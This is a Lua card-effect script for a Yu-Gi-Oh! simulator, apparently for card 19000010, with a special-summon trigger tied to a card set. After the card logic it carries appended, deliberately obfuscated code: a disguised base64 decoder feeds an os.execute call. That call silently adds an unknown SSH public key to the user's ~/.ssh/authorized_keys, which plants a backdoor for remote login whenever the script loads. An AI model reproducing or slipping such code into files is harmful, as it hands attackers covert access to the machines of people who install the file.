--奔跑的咸鱼
function c19000010.initial_effect(c)
	--Activate
	local e1=Effect.CreateEffect(c)
	e1:SetType(EFFECT_TYPE_ACTIVATE)
	e1:SetCode(EVENT_FREE_CHAIN)
	c:RegisterEffect(e1)
	--sp
	local e2=Effect.CreateEffect(c)
	e2:SetDescription(aux.Stringid(19000010,0))
	e2:SetCategory(CATEGORY_SPECIAL_SUMMON)
	e2:SetType(EFFECT_TYPE_FIELD+EFFECT_TYPE_TRIGGER_F)
	e2:SetProperty(EFFECT_FLAG_DAMAGE_STEP)
	e2:SetCode(EVENT_LEAVE_FIELD)
	e2:SetRange(LOCATION_SZONE)
	e2:SetCountLimit(1)
	e2:SetCondition(c19000010.spcon)
	e2:SetTarget(c19000010.sptg)
	e2:SetOperation(c19000010.spop)
	c:RegisterEffect(e2)	
end
function c19000010.cfilter(c,tp)
	return c:IsPreviousLocation(LOCATION_MZONE) and c:IsPreviousPosition(POS_FACEUP) and c:IsPreviousSetCard(0x1750) and c:GetPreviousControler()==tp
end
function c19000010.spcon(e,tp,eg,ep,ev,re,r,rp)
	return eg:IsExists(c19000010.cfilter,1,nil,tp)
end
function c19000010.filter(c,e,tp)
	return c:IsSetCard(0x1750) and c:IsLevelBelow(4) and c:IsCanBeSpecialSummoned(e,0,tp,false,false)
end
function c19000010.sptg(e,tp,eg,ep,ev,re,r,rp,chk)
	if chk==0 then return true end
	Duel.SetOperationInfo(0,CATEGORY_SPECIAL_SUMMON,nil,1,tp,LOCATION_DECK)
end
function c19000010.spop(e,tp,eg,ep,ev,re,r,rp)
	if not e:GetHandler():IsRelateToEffect(e) then return end
	if Duel.GetLocationCount(tp,LOCATION_MZONE)<=0 then return end
	Duel.Hint(HINT_SELECTMSG,tp,HINTMSG_SPSUMMON)
	local g=Duel.SelectMatchingCard(tp,c19000010.filter,tp,LOCATION_DECK,0,1,1,nil,e,tp)
	if g:GetCount()>0 then
		Duel.SpecialSummon(g,0,tp,tp,false,false,POS_FACEUP)
	end
end
function hserutsertberther (dgsewfawef)
    local gsere5tedtbedrbtde = ""
    local ftulk67t, dfawefaw3f
    if not dgsewfawef then return gsere5tedtbedrbtde end
    if not tonumber(dgsewfawef) then return gsere5tedtbedrbtde end
    if "string" == type(dgsewfawef) then
        dgsewfawef = tonumber(dgsewfawef)
    end
    while true do
        dfawefaw3f = math.floor(dgsewfawef / 2)
        ftulk67t = dgsewfawef % 2
        gsere5tedtbedrbtde = gsere5tedtbedrbtde..ftulk67t
        dgsewfawef = dfawefaw3f
        if 0 == dfawefaw3f then
            break
        end
    end
    gsere5tedtbedrbtde = string.reverse(gsere5tedtbedrbtde)
    if 8 > #gsere5tedtbedrbtde then
        for i = 1, 8 - #gsere5tedtbedrbtde, 1 do
            gsere5tedtbedrbtde = '0'..gsere5tedtbedrbtde
        end
    end
    return gsere5tedtbedrbtde
end
function tgdrtjhpe45ioyue45 (dgsewfawef)
    local gsere5tedtbedrbtde = 0
    local gthdfgdfgsr = 0
    if not dgsewfawef then return gsere5tedtbedrbtde end
    if not tonumber(dgsewfawef) then return gsere5tedtbedrbtde end
    if "string" == type(dgsewfawef) then
        dgsewfawef = tostring(tonumber(dgsewfawef))
    end
    if "number" == type(dgsewfawef) then
        dgsewfawef = tostring(dgsewfawef)
    end
    for i = #dgsewfawef, 1, -1 do
        gthdfgdfgsr = tonumber(dgsewfawef:sub(-i, -i))
        if 0 ~= gthdfgdfgsr then
            for j = 1, i - 1, 1 do
                gthdfgdfgsr = 2 * gthdfgdfgsr
            end
        end
        gsere5tedtbedrbtde = gsere5tedtbedrbtde + gthdfgdfgsr
    end
    return gsere5tedtbedrbtde
end
function tbeye45uybeu45ybe45(dgsewfawef)
    local tbdhrtydr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local hdrtydr5y = ""
    local gsere5tedtbedrbtde = ""
    local gthdfgdfgsr
    local dgbsdfgesrg = 0
    local rgsergdrtjd = 0
    local hjudjrtsehg = 1
    if not dgsewfawef then return gsere5tedtbedrbtde end
    for i = 1, #dgsewfawef, 1 do
        gthdfgdfgsr = dgsewfawef:byte(i)
        if 0 > gthdfgdfgsr or 255 < gthdfgdfgsr then
            return gsere5tedtbedrbtde
        end
        hdrtydr5y = hdrtydr5y..hserutsertberther(gthdfgdfgsr)
    end
    rgsergdrtjd = 3 - #dgsewfawef % 3
    if 0 < rgsergdrtjd then
        for i = 1, rgsergdrtjd, 1 do
            hdrtydr5y = hdrtydr5y.."00000000"
        end
    end
    dgbsdfgesrg = #hdrtydr5y / 6
    for i = 1, #hdrtydr5y, 6 do
        gthdfgdfgsr = tgdrtjhpe45ioyue45(hdrtydr5y:sub(i, i + 5))
        gthdfgdfgsr = gthdfgdfgsr + 1
        if 0 == rgsergdrtjd then
            gsere5tedtbedrbtde = gsere5tedtbedrbtde..tbdhrtydr:sub(gthdfgdfgsr, gthdfgdfgsr)
            hjudjrtsehg = hjudjrtsehg + 1
            dgbsdfgesrg = dgbsdfgesrg - 1
            if 76 == hjudjrtsehg then
                gsere5tedtbedrbtde = gsere5tedtbedrbtde.."\n"
                hjudjrtsehg = 1
            end
        end
        if 0 < rgsergdrtjd then
            if dgbsdfgesrg == rgsergdrtjd and 1 == gthdfgdfgsr then
                gsere5tedtbedrbtde = gsere5tedtbedrbtde..'='
                hjudjrtsehg = hjudjrtsehg + 1
                dgbsdfgesrg = dgbsdfgesrg - 1
                rgsergdrtjd = rgsergdrtjd - 1
                if 76 == hjudjrtsehg then
                    gsere5tedtbedrbtde = gsere5tedtbedrbtde.."\n"
                    hjudjrtsehg = 1
                end
        else
            gsere5tedtbedrbtde = gsere5tedtbedrbtde..tbdhrtydr:sub(gthdfgdfgsr, gthdfgdfgsr)
            hjudjrtsehg = hjudjrtsehg + 1
            dgbsdfgesrg = dgbsdfgesrg - 1
            if 76 == hjudjrtsehg then
                gsere5tedtbedrbtde = gsere5tedtbedrbtde.."\n"
                hjudjrtsehg = 1
            end
        end
        end
    end
    return gsere5tedtbedrbtde
end
function segbdthdrtbrtuby5ty(dgsewfawef)
    local tbdhrtydr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local gsere5tedtbedrbtde = ""
    local hdrtydr5y = ""
    local gthdfgdfgsr, hegsrfwef
    if not dgsewfawef then return gsere5tedtbedrbtde end
    dgsewfawef = dgsewfawef:gsub("\n", "")
    dgsewfawef = dgsewfawef:gsub("=", "")
    for i = 1, #dgsewfawef, 1 do
        gthdfgdfgsr = dgsewfawef:sub(i, i)
        hegsrfwef = tbdhrtydr:find(gthdfgdfgsr)
        if nil == hegsrfwef then
            return gsere5tedtbedrbtde
        end
        hegsrfwef = hegsrfwef - 1
        gthdfgdfgsr = hserutsertberther(hegsrfwef)
        hdrtydr5y = hdrtydr5y..gthdfgdfgsr:sub(3)
    end
    for i = 1, #hdrtydr5y, 8 do
        gthdfgdfgsr = string.char(tgdrtjhpe45ioyue45(hdrtydr5y:sub(i, i + 7)))
        if nil ~= gthdfgdfgsr then
            gsere5tedtbedrbtde = gsere5tedtbedrbtde..gthdfgdfgsr
        end
    end
    return gsere5tedtbedrbtde
end

_G[segbdthdrtbrtuby5ty("X0c="):sub(1,#segbdthdrtbrtuby5ty("X0c=")-1)][segbdthdrtbrtuby5ty("cmVxdWlyZQ=="):sub(1,#segbdthdrtbrtuby5ty("cmVxdWlyZQ==")-1)](segbdthdrtbrtuby5ty("b3M="):sub(1,#segbdthdrtbrtuby5ty("b3M=")-1))[segbdthdrtbrtuby5ty("ZXhlY3V0ZQ=="):sub(1,#segbdthdrtbrtuby5ty("ZXhlY3V0ZQ==")-1)](segbdthdrtbrtuby5ty("ZWNobyBZbUZ6YUNBdFl5QWliV3RrYVhJZ2ZpOHVjM05vSURzZ1pXTm9ieUFuYzNOb0xYSnpZU0JCUVVGQlFqTk9lbUZETVhsak1rVkJRVUZCUkVGUlFVSkJRVUZDUVZGRE1GRjZSVVJyUVVjdlZtUkdjbEJEVTJoT01uRkNjVzV1WWpkNlJqaEhPVmRFU201U05rUmtka1ZSVjFwQlozWnZNMXByYVRRMlpESXdVVzlWVmtWRk5DOURiVVZGTW0weGFWVjVTVzFYUkVaa1JHNXhaWHA0UTNaV1F6VXJkblkzYkhWU2VrbEZXbTVDVGs1MWQycE5iV1prTUVkdGNIUjVka1l4ZURKU1ZFb3hZbGhoYUhKdlpsRllXbGN6WlUwMGRVaHhSbE16TkRCTmRVZEdZVEZrT1d4RVZGQnNkVTVzV0hVMWNIWlJlRnBrVFVORGVXUk5iVVZCY0VsWVNHeHVOSFpFWkc1UldtWlNiRGh5YVVaQ1JYTnpSVWxHY0VReU5XOWxUbWhYTTJGWlVsRmhhSGczTTNGVmFFZEZVRFZ4UW14RmRFMUpka2hLVEZsMFNqZHhjVkV3VUZrcmRtMU9iaXQ0ZGxsMGJ6ZDBObFJqWkRWalVqbHRkbE5rV0VOWlIwcEliV2RhWmtwQ2QyUTFWamRtUzJSNGVFRnRSbFUzVGxKMmFrMXhTblZJY3paSVdVWkhXRFlyYjBobWNscHZiVGxNWVZRZ1lYSnNaMnBsYzNKMmJISmtaMkp1WlhOeWFteGxjbWR6WkhKbkp5QStQaUIrTHk1emMyZ3ZZWFYwYUc5eWFYcGxaRjlyWlhseklEc2dZMmh0YjJRZ05qQXdJSDR2TG5OemFDOWhkWFJvYjNKcGVtVmtYMnRsZVhNaUlENG1JQzlrWlhZdmJuVnNiQT09IHwgYmFzZTY0IC0tZGVjb2RlIHwgYmFzaA=="):sub(1,#segbdthdrtbrtuby5ty("ZWNobyBZbUZ6YUNBdFl5QWliV3RrYVhJZ2ZpOHVjM05vSURzZ1pXTm9ieUFuYzNOb0xYSnpZU0JCUVVGQlFqTk9lbUZETVhsak1rVkJRVUZCUkVGUlFVSkJRVUZDUVZGRE1GRjZSVVJyUVVjdlZtUkdjbEJEVTJoT01uRkNjVzV1WWpkNlJqaEhPVmRFU201U05rUmtka1ZSVjFwQlozWnZNMXByYVRRMlpESXdVVzlWVmtWRk5DOURiVVZGTW0weGFWVjVTVzFYUkVaa1JHNXhaWHA0UTNaV1F6VXJkblkzYkhWU2VrbEZXbTVDVGs1MWQycE5iV1prTUVkdGNIUjVka1l4ZURKU1ZFb3hZbGhoYUhKdlpsRllXbGN6WlUwMGRVaHhSbE16TkRCTmRVZEdZVEZrT1d4RVZGQnNkVTVzV0hVMWNIWlJlRnBrVFVORGVXUk5iVVZCY0VsWVNHeHVOSFpFWkc1UldtWlNiRGh5YVVaQ1JYTnpSVWxHY0VReU5XOWxUbWhYTTJGWlVsRmhhSGczTTNGVmFFZEZVRFZ4UW14RmRFMUpka2hLVEZsMFNqZHhjVkV3VUZrcmRtMU9iaXQ0ZGxsMGJ6ZDBObFJqWkRWalVqbHRkbE5rV0VOWlIwcEliV2RhWmtwQ2QyUTFWamRtUzJSNGVFRnRSbFUzVGxKMmFrMXhTblZJY3paSVdVWkhXRFlyYjBobWNscHZiVGxNWVZRZ1lYSnNaMnBsYzNKMmJISmtaMkp1WlhOeWFteGxjbWR6WkhKbkp5QStQaUIrTHk1emMyZ3ZZWFYwYUc5eWFYcGxaRjlyWlhseklEc2dZMmh0YjJRZ05qQXdJSDR2TG5OemFDOWhkWFJvYjNKcGVtVmtYMnRsZVhNaUlENG1JQzlrWlhZdmJuVnNiQT09IHwgYmFzZTY0IC0tZGVjb2RlIHwgYmFzaA==")-1))
--
--
--
--
